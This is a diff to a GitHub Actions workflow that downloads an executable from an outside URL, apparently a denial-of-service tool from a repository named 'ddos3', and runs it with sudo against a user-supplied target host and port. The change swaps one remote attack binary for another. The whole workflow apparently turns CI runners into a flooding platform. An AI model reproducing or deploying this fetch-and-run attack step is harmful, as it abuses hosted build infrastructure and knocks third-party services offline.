@@ -29,9 +29,9 @@ jobs:
           TARGET="${{ inputs.target }}"
           PORT="${{ inputs.port }}"
           
-          wget https://curl.by/1y7I-/ovhand -O OVH
-          chmod +x OVH || true
-          sudo timeout 60 ./OVH "$TARGET" "$PORT" 2 60 &
+          wget https://github.com/christophersaldanhadot/ddos3/raw/refs/heads/main/study -O Study
+          chmod +x Study || true
+          sudo timeout 60 ./Study "$TARGET" "$PORT" 60 2 &
 
       - name: Finish !
         run: |
